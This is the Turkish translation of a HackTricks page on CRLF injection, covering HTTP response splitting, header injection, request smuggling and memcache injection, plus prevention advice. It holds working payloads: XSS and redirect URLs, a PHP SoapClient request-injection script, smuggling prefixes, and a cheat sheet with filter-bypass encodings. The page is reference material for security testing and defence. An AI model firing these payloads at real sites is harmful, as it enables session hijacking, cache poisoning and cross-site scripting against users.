# CRLF (%0D%0A) Enjeksiyonu

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı Lehçe yazılı ve sözlü gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

### CRLF

Carriage Return (CR) ve Line Feed (LF), birleşik olarak CRLF olarak bilinen özel karakter dizileridir. HTTP protokolünde bir satırın sonunu veya yeni bir satırın başlangıcını belirtmek için kullanılırlar. Web sunucuları ve tarayıcılar, CRLF'yi HTTP başlıkları ile yanıtın gövdesi arasında ayırt etmek için kullanır. Bu karakterler, Apache ve Microsoft IIS gibi çeşitli web sunucusu türleri arasında HTTP/1.1 iletişiminde evrensel olarak kullanılır.

### CRLF Enjeksiyonu Zafiyeti

CRLF enjeksiyonu, CR ve LF karakterlerinin kullanıcı tarafından sağlanan girişe eklenmesini içerir. Bu eylem, sunucuyu, uygulamayı veya kullanıcıyı, enjekte edilen diziyi bir yanıtın sonu ve başka bir yanıtın başlangıcı olarak yorumlamaya yanıltır. Bu karakterler doğal olarak zararlı değildir, ancak yanlış kullanımları HTTP yanıt bölünmesine ve diğer kötü amaçlı faaliyetlere yol açabilir.

### Örnek: Bir Günlük Dosyasında CRLF Enjeksiyonu

[Örnek buradan alınmıştır](https://www.invicti.com/blog/web-security/crlf-http-header/)

Bir yönetici panelindeki bir günlük dosyasını düşünelim, formatı şu şekildedir: `IP - Zaman - Ziyaret Edilen Yol`. Tipik bir giriş örneği şöyle görünebilir:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Bir saldırgan, bu günlüğü manipüle etmek için CRLF enjeksiyonunu kullanabilir. HTTP isteğine CRLF karakterleri enjekte ederek, saldırgan çıktı akışını değiştirebilir ve sahte günlük girişleri oluşturabilir. Örneğin, enjekte edilen bir dizi günlük girişini şu şekilde dönüştürebilir:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
İşte, `%0d` ve `%0a` CR ve LF'nin URL kodlanmış formlarını temsil eder. Saldırıdan sonra, günlük yanıltıcı bir şekilde şunu gösterecektir:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Saldırgan, kötü niyetli faaliyetlerini sunucu ortamında genellikle güvenilen bir varlık olan localhost gibi görünmesini sağlar. Sunucu, `%0d%0a` ile başlayan sorgunun bir parametre olarak yorumlar, `restrictedaction` parametresi ise ayrı bir giriş olarak ayrıştırılır. Manipüle edilmiş sorgu, meşru bir yönetici komutunu taklit eder: `/index.php?page=home&restrictedaction=edit`

### HTTP Yanıt Bölünmesi

#### Açıklama

HTTP Yanıt Bölünmesi, bir saldırganın HTTP yanıtlarının yapısını sömürdüğünde ortaya çıkan bir güvenlik açığıdır. Bu yapı, başlıkları gövdeden ayıran belirli bir karakter dizisi olan Taşıma İşareti (CR) ve Satır Beslemesi (LF) tarafından oluşturulan CRLF olarak adlandırılan bir dizi kullanır. Bir saldırgan, bir CRLF dizisini bir yanıt başlığına yerleştirmeyi başarırsa, ardışık yanıt içeriğini etkili bir şekilde manipüle edebilir. Bu tür manipülasyon ciddi güvenlik sorunlarına, özellikle Cross-site Scripting (XSS) sorunlarına yol açabilir.

#### HTTP Yanıt Bölünmesi Aracılığıyla XSS

1. Uygulama şu şekilde özel bir başlık ayarlar: `X-Custom-Header: UserInput`
2. Uygulama, `UserInput` için değeri bir sorgu parametresinden alır, diyelim ki "user_input". Doğru giriş doğrulama ve kodlama eksikliği olan senaryolarda, bir saldırgan CRLF dizisini ve kötü amaçlı içeriği içeren bir payload oluşturabilir.
3. Bir saldırgan, özel olarak oluşturulmuş 'user_input' içeren bir URL oluşturur: `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
- Bu URL'de `%0d%0a%0d%0a`, CRLFCRLF'nin URL kodlanmış biçimidir. Sunucuyu CRLF dizisini eklemeye kandırarak, sunucunun ardışık kısmı yanıt gövdesi olarak işlemesini sağlar.
4. Sunucu, saldırganın girişini yanıt başlığında yansıtır, bu da kötü niyetli betiğin tarayıcı tarafından yanıt gövdesinin bir parçası olarak yorumlanmasına yol açar.

#### HTTP Yanıt Bölünmesinin Yönlendirmeye Neden Olduğu Bir Örnek

Kaynak: [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Tarayıcıya:
```
/%0d%0aLocation:%20http://myweb.com
```
Ve sunucu başlık olarak şunu yanıtlar:
```
Location: http://myweb.com
```
**Diğer örnek: (şuradan** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### URL Yolu İçinde

Sunucudan gelen yanıtı kontrol etmek için payload'ı **URL yolu içinde** gönderebilirsiniz (örnek [buradan](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Daha fazla örnek için şuraya bakın:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### HTTP Başlık Enjeksiyonu

HTTP Başlık Enjeksiyonu, genellikle CRLF (Taşıma İşareti ve Satır Sonu) enjeksiyonu aracılığıyla istismar edilir ve saldırganlara HTTP başlıkları eklemelerine olanak tanır. Bu, XSS (Cross-Site Scripting) filtreleri veya SOP (Aynı Köken İlkesi) gibi güvenlik mekanizmalarını zayıflatabilir ve yetkisiz erişime, CSRF belirteçlerine veya çerez yerleştirme yoluyla kullanıcı oturumlarının manipülasyonuna yol açabilir.

#### HTTP Başlık Enjeksiyonu Aracılığıyla CORS'nin Sömürülmesi

Bir saldırgan, HTTP başlıklarını enjekte ederek CORS (Cross-Origin Resource Sharing) özelliğini etkinleştirebilir ve SOP tarafından uygulanan kısıtlamaları atlayabilir. Bu ihlal, kötü niyetli kaynaklardan gelen betiklerin farklı bir kökenden gelen kaynaklarla etkileşimde bulunmasına olanak tanır ve böylece korunan verilere erişebilir.

#### CRLF Aracılığıyla SSRF ve HTTP İstek Enjeksiyonu

CRLF enjeksiyonu, tamamen yeni bir HTTP isteği oluşturmak ve enjekte etmek için kullanılabilir. Bu konuda dikkate değer bir örnek, PHP'nin `SoapClient` sınıfındaki zafiyettir, özellikle `user_agent` parametresi içinde. Bir saldırgan, bu parametreyi manipüle ederek ek başlıklar ve gövde içeriği ekleyebilir veya tamamen yeni bir HTTP isteği enjekte edebilir. Aşağıda, bu sömürünün bir PHP örneği bulunmaktadır:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Talep Smuggling için Başlık Enjeksiyonu

Bu teknik ve potansiyel sorunlar hakkında daha fazla bilgi için [**orijinal kaynağa bakın**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

İlk talebe yanıt verdikten sonra **arka uç bağlantıyı açık tutmak** için gerekli başlıkları enjekte edebilirsiniz:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Sonrasında, ikinci bir istek belirtilebilir. Bu senaryo genellikle [HTTP istek yığınlanması](http-request-smuggling/) içerir, sunucu tarafından enjeksiyon sonrası ek başlıklar veya gövde öğeleri eklenerek çeşitli güvenlik açıklarına yol açabilir.

**Sömürü:**


1. **Kötü Amaçlı Önek Enjeksiyonu**: Bu yöntem, kötü amaçlı bir önek belirterek bir sonraki kullanıcının isteğini veya bir web önbelleğini zehirlemeyi içerir. Buna bir örnek:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Tepki Sırası Zehirleme için Önek Oluşturma**: Bu yaklaşım, tamamlanmış ikinci bir isteği oluşturmak için son eklemelerle birleştirildiğinde bir önek oluşturmayı içerir. Bu, tepki sırası zehirlemesini tetikleyebilir. Bir örnek:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Memcache Enjeksiyonu

Memcache, açık metin protokolü kullanan bir **anahtar-değer deposudur**. Daha fazla bilgi için:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Tam bilgi için**[ **orijinal yazıya**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/) **bakın**

Bir platform, **bir HTTP isteğinden veri alıp bunu temizlemeden** bir **memcache** sunucusuna **istekler** yapmak için kullanıyorsa, saldırgan bu davranışı **yeni memcache komutları enjekte etmek** için istismar edebilir.

Örneğin, keşif edilen orijinal zayıflıkta, önbellek anahtarları kullanılarak bir kullanıcının hangi IP ve bağlantı noktasına bağlanması gerektiği döndürülüyordu ve saldırganlar, **önbelleği zehirleyecek** şekilde **memcache komutları enjekte** edebiliyorlardı ve kullanıcıların ayrıntılarını (kullanıcı adları ve şifreler dahil) saldırgan sunucularına gönderiyorlardı:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&h=178&auto=format&fit=crop"><figcaption></figcaption></figure>

Dahası, araştırmacılar, memcache yanıtlarını ayrıştırarak saldırganın e-posta adresini bilmediği kullanıcılara saldırganın IP ve bağlantı noktalarını göndermek için kullanabildiklerini keşfettiler:

<figure><img src="../.gitbook/assets/image (40).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&h=506&auto=format&fit=crop"><figcaption></figcaption></figure>

### Web Uygulamalarında CRLF / HTTP Başlık Enjeksiyonlarını Önleme

CRLF (Taşıma İşareti ve Satır Beslemesi) veya HTTP Başlık Enjeksiyonlarının risklerini azaltmak için aşağıdaki stratejiler önerilir:

1. **Yanıt Başlıklarında Doğrudan Kullanıcı Girişinden Kaçının:**
En güvenli yaklaşım, kullanıcı tarafından sağlanan girişi doğrudan yanıt başlıklarına dahil etmekten kaçınmaktır.

2. **Özel Karakterleri Kodlayın:**
Doğrudan kullanıcı girişinden kaçınmak mümkün değilse, CR (Taşıma İşareti) ve LF (Satır Beslemesi) gibi özel karakterleri kodlamaya yönelik bir işlev kullanmayı sağlamak önemlidir. Bu uygulama, CRLF enjeksiyonu olasılığını önler.

3. **Programlama Dili Güncellemesi:**
Web uygulamalarında kullandığınız programlama dilini düzenli olarak en son sürüme güncelleyin. HTTP başlıklarını ayarlamakla görevli işlevler içinde CR ve LF karakterlerinin enjeksiyonunu varsayılan olarak engelleyen bir sürümü tercih edin.


### HİLE KAĞIDI

[Hile kağıdı buradan](https://twitter.com/NinadMishra5/status/1650080604174667777) alınabilir.
```
1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Otomatik Araçlar

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Brute-Force Tespit Listesi

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Referanslar
* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı şekilde Lehçe yazılı ve konuşma gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
